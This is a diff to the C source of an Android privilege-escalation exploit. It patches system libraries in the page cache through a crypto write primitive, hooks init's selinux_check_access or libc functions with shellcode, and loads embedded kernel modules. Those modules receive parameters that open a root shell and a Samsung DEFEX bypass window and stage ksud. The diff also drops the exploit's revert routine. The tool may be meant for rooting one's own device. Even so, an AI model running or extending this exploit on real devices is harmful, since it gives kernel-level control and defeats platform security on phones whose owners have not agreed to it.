@@ -12,6 +12,8 @@
 #include <sys/uio.h>
 #include <sys/wait.h>
 #include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <sys/system_properties.h>
 #include <sys/utsname.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -257,8 +259,10 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 extern char libcxx_start[];
 extern char libcxx_data[];
 extern uint32_t libcxx_len;
-extern char libcxx_first_inst_copy[];
 extern uint32_t libcxx_ko_target_off;
+extern uint32_t libcxx_params_off;
+extern char libcxx_first_inst_copy[];
+
 
 asm(
     ".section .rodata\n"
@@ -296,18 +300,62 @@ extern char temproot_ko_16_6_12_start[], temproot_ko_16_6_12_end[];
 extern char temproot_ko_17_6_18_start[], temproot_ko_17_6_18_end[];
 extern char splice_helper_start[], splice_helper_end[];
 
-struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };
+/* GhostSam dfr_lkm modules (prebuilt, see ko/dfr_lkm-NOTICE.md): used on
+ * Samsung devices, where they are proven to load without panicking while the
+ * temproot module's permanent text patches are a panic risk there. */
+asm(
+    ".section .rodata\n"
+    ".global dfrko_12_5_10_start\n.global dfrko_12_5_10_end\n"
+    "dfrko_12_5_10_start:\n.incbin \"ko/dfr_lkm-android12-5.10.ko\"\ndfrko_12_5_10_end:\n"
+    ".global dfrko_13_5_10_start\n.global dfrko_13_5_10_end\n"
+    "dfrko_13_5_10_start:\n.incbin \"ko/dfr_lkm-android13-5.10.ko\"\ndfrko_13_5_10_end:\n"
+    ".global dfrko_13_5_15_start\n.global dfrko_13_5_15_end\n"
+    "dfrko_13_5_15_start:\n.incbin \"ko/dfr_lkm-android13-5.15.ko\"\ndfrko_13_5_15_end:\n"
+    ".global dfrko_14_5_15_start\n.global dfrko_14_5_15_end\n"
+    "dfrko_14_5_15_start:\n.incbin \"ko/dfr_lkm-android14-5.15.ko\"\ndfrko_14_5_15_end:\n"
+    ".global dfrko_14_6_1_start\n.global dfrko_14_6_1_end\n"
+    "dfrko_14_6_1_start:\n.incbin \"ko/dfr_lkm-android14-6.1.ko\"\ndfrko_14_6_1_end:\n"
+    ".global dfrko_15_6_6_start\n.global dfrko_15_6_6_end\n"
+    "dfrko_15_6_6_start:\n.incbin \"ko/dfr_lkm-android15-6.6.ko\"\ndfrko_15_6_6_end:\n"
+    ".global dfrko_16_6_12_start\n.global dfrko_16_6_12_end\n"
+    "dfrko_16_6_12_start:\n.incbin \"ko/dfr_lkm-android16-6.12.ko\"\ndfrko_16_6_12_end:\n"
+    ".global dfrko_17_6_18_start\n.global dfrko_17_6_18_end\n"
+    "dfrko_17_6_18_start:\n.incbin \"ko/dfr_lkm-android17-6.18.ko\"\ndfrko_17_6_18_end:\n"
+);
+extern char dfrko_12_5_10_start[], dfrko_12_5_10_end[];
+extern char dfrko_13_5_10_start[], dfrko_13_5_10_end[];
+extern char dfrko_13_5_15_start[], dfrko_13_5_15_end[];
+extern char dfrko_14_5_15_start[], dfrko_14_5_15_end[];
+extern char dfrko_14_6_1_start[],  dfrko_14_6_1_end[];
+extern char dfrko_15_6_6_start[],  dfrko_15_6_6_end[];
+extern char dfrko_16_6_12_start[], dfrko_16_6_12_end[];
+extern char dfrko_17_6_18_start[], dfrko_17_6_18_end[];
+
+static int      g_dfr;        /* 1 = load GhostSam dfr_lkm with module params */
+static int      g_soft_reboot;
+static char     g_ksud_token[104];
+
+struct KoImage { int android_release, kver_major, kver_minor;
+                 const char *tr_start, *tr_end, *dfr_start, *dfr_end; };
 
 static const struct KoImage *select_ko_image(int andr, int major, int minor) {
     static const struct KoImage imgs[] = {
-        {12, 5, 10, temproot_ko_12_5_10_start, temproot_ko_12_5_10_end},
-        {13, 5, 10, temproot_ko_13_5_10_start, temproot_ko_13_5_10_end},
-        {13, 5, 15, temproot_ko_13_5_15_start, temproot_ko_13_5_15_end},
-        {14, 5, 15, temproot_ko_14_5_15_start, temproot_ko_14_5_15_end},
-        {14, 6,  1, temproot_ko_14_6_1_start,  temproot_ko_14_6_1_end},
-        {15, 6,  6, temproot_ko_15_6_6_start,  temproot_ko_15_6_6_end},
-        {16, 6, 12, temproot_ko_16_6_12_start, temproot_ko_16_6_12_end},
-        {17, 6, 18, temproot_ko_17_6_18_start, temproot_ko_17_6_18_end},
+        {12, 5, 10, temproot_ko_12_5_10_start, temproot_ko_12_5_10_end,
+                    dfrko_12_5_10_start,       dfrko_12_5_10_end},
+        {13, 5, 10, temproot_ko_13_5_10_start, temproot_ko_13_5_10_end,
+                    dfrko_13_5_10_start,       dfrko_13_5_10_end},
+        {13, 5, 15, temproot_ko_13_5_15_start, temproot_ko_13_5_15_end,
+                    dfrko_13_5_15_start,       dfrko_13_5_15_end},
+        {14, 5, 15, temproot_ko_14_5_15_start, temproot_ko_14_5_15_end,
+                    dfrko_14_5_15_start,       dfrko_14_5_15_end},
+        {14, 6,  1, temproot_ko_14_6_1_start,  temproot_ko_14_6_1_end,
+                    dfrko_14_6_1_start,        dfrko_14_6_1_end},
+        {15, 6,  6, temproot_ko_15_6_6_start,  temproot_ko_15_6_6_end,
+                    dfrko_15_6_6_start,        dfrko_15_6_6_end},
+        {16, 6, 12, temproot_ko_16_6_12_start, temproot_ko_16_6_12_end,
+                    dfrko_16_6_12_start,       dfrko_16_6_12_end},
+        {17, 6, 18, temproot_ko_17_6_18_start, temproot_ko_17_6_18_end,
+                    dfrko_17_6_18_start,       dfrko_17_6_18_end},
     };
     const struct KoImage *fb = NULL;
     for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
@@ -342,8 +390,7 @@ static int read_device_versions(int *andr, int *major, int *minor) {
     return (*andr > 0) ? 0 : -1;
 }
 
-/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
-static char *pad16(const char *data, size_t len, size_t *out_len) {
+/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */static char *pad16(const char *data, size_t len, size_t *out_len) {
     size_t padded = (len + 15) & ~(size_t)15;
     char *buf = calloc(1, padded);
     if (buf) memcpy(buf, data, len);
@@ -386,17 +433,36 @@ static int patch_ko(void) {
     if (!ko) {
         printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
     }
-    printf("Using KMI: android%d-%d.%d\n",
-             ko->android_release, ko->kver_major, ko->kver_minor);
+    printf("Using KMI: android%d-%d.%d (%s)\n",
+           ko->android_release, ko->kver_major, ko->kver_minor,
+           g_dfr ? "GhostSam dfr_lkm" : "DFRoot temproot");
 
+    const char *start = g_dfr ? ko->dfr_start : ko->tr_start;
+    const char *end   = g_dfr ? ko->dfr_end   : ko->tr_end;
     size_t len;
-    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
+    char *buf = pad16(start, (size_t)(end - start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
-    printf("patch: %s <- temproot.ko (%zu bytes)\n", libcxx_ko_target, len);
+    printf("patch: %s <- %s.ko (%zu bytes)\n", libcxx_ko_target,
+           g_dfr ? "dfr_lkm" : "temproot", len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
     if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
     return ret;
+}
+
+/* Fill the shellcode's NUL-separated insmod parameter block. The dfr_lkm
+ * module uses these to run the chain tail itself: DEFEX kprobe window +
+ * ksud materialization at /dev/.ksud + kernel-side UMH late-load. Only the
+ * non-default parameters are passed; defaults (enforce=0 stay=0 use_kp=1)
+ * are what the module already ships with. */
+static void write_hook_params(void) {
+    char *w = libcxx_data + libcxx_params_off;
+    if (!g_dfr) { *w = '\0'; return; }
+    memcpy(w, "tail=1\0\0", sizeof("tail=1") + 1);               w += sizeof("tail=1");
+    memcpy(w, "allow_shell=1\0\0", sizeof("allow_shell=1") + 1); w += sizeof("allow_shell=1");
+    w += sprintf(w, "soft_reboot=%d", g_soft_reboot) + 1;
+    w += sprintf(w, "%s", g_ksud_token) + 1;
+    *w = '\0';
 }
 
 static void cleanup(void) {
@@ -467,14 +533,95 @@ static int patch_hook(const char *lib, const char *sym,
     free(buf);
     if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
 
+    /* Never install the trampoline without confirming the code is there: a
+     * write that landed on a copy would otherwise branch init into old bytes. */
+    uint32_t want_shell = 0, got_shell = 0;
+    memcpy(&want_shell, stage_data + start_delta, 4);
+    int sfd = open(lib, O_RDONLY);
+    if (sfd >= 0) {
+        int ok = pread(sfd, &got_shell, 4, (off_t)(shell_off + start_delta)) == 4;
+        close(sfd);
+        if (!ok || got_shell != want_shell) {
+            printf("shellcode readback FAILED at 0x%lx (got 0x%08x, wanted 0x%08x) - page cache did not change\n",
+                   (long)(shell_off + start_delta), got_shell, want_shell);
+            return -1;
+        }
+        printf("shellcode readback OK (0x%08x)\n", got_shell);
+    }
+
     int pos = (int)(hook_off & 15);
     uint8_t blk[16];
     memcpy(blk, restore->tramp_orig, 16);
     memcpy(&blk[pos], &hook_insn, 4);
     printf("patch: %s <- trampoline (16 bytes)\n", lib);
     int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
-    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
-    return ret2;
+    if (ret2) { printf("patch: %s trampoline patch failed: %d\n", lib, ret2); return ret2; }
+
+    /* A CBC write can report success while landing on a copy (compressed or
+     * isolated page), which would surface only as the 10 s hook timeout. */
+    uint32_t got = 0;
+    int vfd = open(lib, O_RDONLY);
+    if (vfd >= 0) {
+        int ok = pread(vfd, &got, 4, (off_t)(aligned + pos)) == 4;
+        close(vfd);
+        if (!ok || got != hook_insn) {
+            printf("hook site readback FAILED at 0x%lx (got 0x%08x, wanted 0x%08x) - page cache did not change\n",
+                   (long)(aligned + pos), got, hook_insn);
+            return -1;
+        }
+        printf("hook site readback OK (0x%08x)\n", got);
+    }
+    return 0;
+}
+
+/* Hook site candidates, first one that fits wins. libselinux.so is the
+ * primary target (DFRoot #99 / upstream libselinux-hook): init's property
+ * server calls selinux_check_access() on every property set, so the hook
+ * fires even when init's log output is silenced, and the exec tail slack is
+ * large (3104 bytes on Xiaomi 5.10.209-android12-9 where libc++.so only had
+ * 112). The waitid() candidates are the last resort: init is a pre-APEX
+ * binary, so it maps /system/lib64/bootstrap/libc.so, while
+ * /system/lib64/libc.so is a symlink into the runtime APEX patching fine
+ * but never firing (the 2.4 timeout on TECNO LH8n). */
+static const struct { const char *lib, *sym; } hook_candidates[] = {
+    { "/system/lib64/libselinux.so", "selinux_check_access" },
+    { "/system/lib64/libc++.so",
+      "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_" },
+    { "/system/lib64/bootstrap/libc.so", "waitid" },
+    { "/system/lib64/libc.so", "waitid" },
+};
+
+static int patch_hook_any(char *stage_data, uint32_t stage_len, char *stage_start,
+                          char *first_inst_copy, struct PatchRestore *restore) {
+    /* Proof of which libc init executes, for the next unsupported ROM. */
+    struct stat apex_st, boot_st;
+    if (stat("/system/lib64/libc.so", &apex_st) == 0 &&
+        stat("/system/lib64/bootstrap/libc.so", &boot_st) == 0) {
+        printf("libc inodes: /system/lib64=%lu bootstrap=%lu%s\n",
+               (unsigned long)apex_st.st_ino, (unsigned long)boot_st.st_ino,
+               apex_st.st_ino == boot_st.st_ino ? " (same file)" : " (different files)");
+    } else {
+        printf("no /system/lib64/bootstrap/libc.so (%s)\n", strerror(errno));
+    }
+    for (size_t i = 0; i < sizeof(hook_candidates) / sizeof(hook_candidates[0]); i++) {
+        int r = patch_hook(hook_candidates[i].lib, hook_candidates[i].sym,
+                           stage_data, stage_len, stage_start, first_inst_copy, restore);
+        if (r == 0) return 0;
+        printf("hook %s failed (%d)\n", hook_candidates[i].lib, r);
+    }
+    printf("no hook candidate fits - DEVICE NOT SUPPORTED\n");
+    return -1;
+}
+
+static int createOrphanProcess(void);
+static void triggerHook(void) {
+    /* init's property server calls selinux_check_access() on every property
+     * set, denied or not and regardless of any log setting - so this fires
+     * the libselinux hook on devices whose init logging is silenced.
+     * The orphan process only covers the legacy log/reap hook candidates. */
+    printf("Triggering hook via property service...\n");
+    __system_property_set("dfroot.trigger", "1");
+    createOrphanProcess();
 }
 
 static int createOrphanProcess(void) {
@@ -515,7 +662,9 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX [--probe]\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX "
+            "[--lkm dfr|temproot] [--soft-reboot 0|1] "
+            "[--ksud-src PATH] [--probe]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -523,6 +672,8 @@ static int setup(int argc, char **argv) {
     uint32_t spi = 0;
     uint8_t aes_key[32];
     int have_aes = 0;
+    const char *lkm = "temproot";
+    const char *ksud_src = NULL;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -534,11 +685,27 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--lkm") && i + 1 < argc)
+            lkm = argv[++i];
+        else if (!strcmp(a, "--soft-reboot") && i + 1 < argc)
+            g_soft_reboot = atoi(argv[++i]);
+        else if (!strcmp(a, "--ksud-src") && i + 1 < argc)
+            ksud_src = argv[++i];
         else if (!strcmp(a, "--probe"))
             g_probe = 1;
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
+        usage(argv[0]); return 2;
+    }
+    if (!strcmp(lkm, "dfr")) {
+        if (!ksud_src) { usage(argv[0]); return 2; }
+        if (snprintf(g_ksud_token, sizeof(g_ksud_token), "ksud_src=%s", ksud_src)
+                >= (int)sizeof(g_ksud_token)) {
+            printf("lkm dfr: ksud path too long\n"); return 2;
+        }
+        g_dfr = 1;
+    } else if (strcmp(lkm, "temproot")) {
         usage(argv[0]); return 2;
     }
 
@@ -552,9 +719,12 @@ static int setup(int argc, char **argv) {
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
     strncpy(libcxx_ko_target, ko_target, 63);
     libcxx_ko_target[63] = '\0';
+    write_hook_params();
 
     printf("=== setup ===\n");
     printf("found ko_target: %s\n", ko_target);
+    printf("lkm: %s\n", g_dfr ? "dfr (GhostSam chain tail, ksud staged for /dev/.ksud late-load)"
+                            : "temproot");
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
     return 0;
@@ -566,23 +736,22 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
-    if (patch_hook("/system/lib64/libc++.so",
-                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
-                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                   &g_libcxx_r)) goto done;
+    if (patch_hook_any(libcxx_data, libcxx_len, libcxx_start,
+                       libcxx_first_inst_copy, &g_libcxx_r)) goto done;
 
     rc = 2;
     usleep(500000);
-    
-    printf("\n=== init  ===\n");
-    createOrphanProcess();
 
-    static const struct {
+    printf("\n=== init  ===\n");
+    triggerHook();
+
+    typedef struct {
         const char *path;
         const char *msg;
         int         rc;
-    } markers[] = {
-        { "/dev/tr",    "libc++: loading custom module",                    -1 },
+    } marker_t;
+    static const marker_t markers_all[] = {
+        { "/dev/tr",    "libselinux: loading custom module",                -1 },
         { "/dev/trm0",  "kernel module: launching bootstrap",               -1 },
         { "/dev/trm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/trme0", "bootstrap: ERROR - reading prefs failed",           1 },
@@ -596,11 +765,42 @@ static int exploit(void) {
         { "/dev/trm6",  "ksud start: SUCCESS",                               0 },
         { "/dev/trme2", "ksud start: ERROR - ksud nonzero exit",             1 },
     };
-    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
+    /* dfr_lkm runs its own chain tail (DEFEX window + kernel-side UMH
+     * late-load of the staged ksud), so the bootstrap markers never appear.
+     * Root proof comes from the su probe in ExploitRunner; /dev/.ksud only
+     * says the module loaded and started the handoff. */
+    static const marker_t markers_dfr[] = {
+        { "/dev/tr",    "libselinux: loading custom module",                -1 },
+        { "/dev/.ksud", "kernel module: ksud staged for late-load",          0 },
+    };
+    const marker_t *markers = g_dfr ? markers_dfr : markers_all;
+    const size_t marker_count = (g_dfr ? sizeof(markers_dfr) : sizeof(markers_all))
+                                / sizeof(marker_t);
+    int seen[16] = {0};
+
+    /* The hook's insmod stderr is /dev/trlog (tmpfs - a panic would erase it).
+     * Once /dev/tr proves the hook fired, stream any new content into our
+     * own fsynced log so the reason survives even if the module hangs. */
+    static char trlog_last[1024];
 
     for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
         usleep(10000);
-        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
+        if (seen[0]) {
+            int fd = open("/dev/trlog", O_RDONLY);
+            if (fd >= 0) {
+                char buf[1024];
+                ssize_t n = read(fd, buf, sizeof(buf) - 1);
+                close(fd);
+                if (n > 0 && (n != (ssize_t)strlen(trlog_last)
+                              || memcmp(buf, trlog_last, (size_t)n))) {
+                    buf[n] = '\0';
+                    printf("insmod: %s\n", buf);
+                    size_t keep = n < (ssize_t)sizeof(trlog_last) ? (size_t)n : sizeof(trlog_last) - 1;
+                    memcpy(trlog_last, buf, keep);
+                }
+            }
+        }
+        for (size_t j = 0; j < marker_count; j++) {
             if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                 seen[j] = 1;
                 printf("%s\n", markers[j].msg);
@@ -613,33 +813,6 @@ static int exploit(void) {
 done:
     if (rc == 3) printf("patch: ERROR - failed to patch files\n");
     return rc;
-}
-
-static int do_revert(void) {
-    printf("=== revert (unlinking markers & clearing page cache) ===\n");
-    unlink("/dev/tr");
-    unlink("/dev/trlog");
-    unlink("/dev/trm0");
-    unlink("/dev/trm1");
-    unlink("/dev/trme0");
-    unlink("/dev/trm2");
-    unlink("/dev/trmw0");
-    unlink("/dev/trm3");
-    unlink("/dev/trmw1");
-    unlink("/dev/trm4");
-    unlink("/dev/trme1");
-    unlink("/dev/trm5");
-    unlink("/dev/trm6");
-    unlink("/dev/trme2");
-
-    sync();
-    int drop_fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (drop_fd >= 0) {
-        write(drop_fd, "3\n", 2);
-        close(drop_fd);
-    }
-    printf("revert: page cache dropped\n");
-    return 0;
 }
 
 /* Non-destructive exploitability probe.
@@ -698,9 +871,6 @@ out:
 
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
-    if (argc > 1 && !strcmp(argv[1], "--revert")) {
-        return do_revert();
-    }
     if (setup(argc, argv) != 0) return 2;
     if (g_probe) {
         int rc = do_probe();
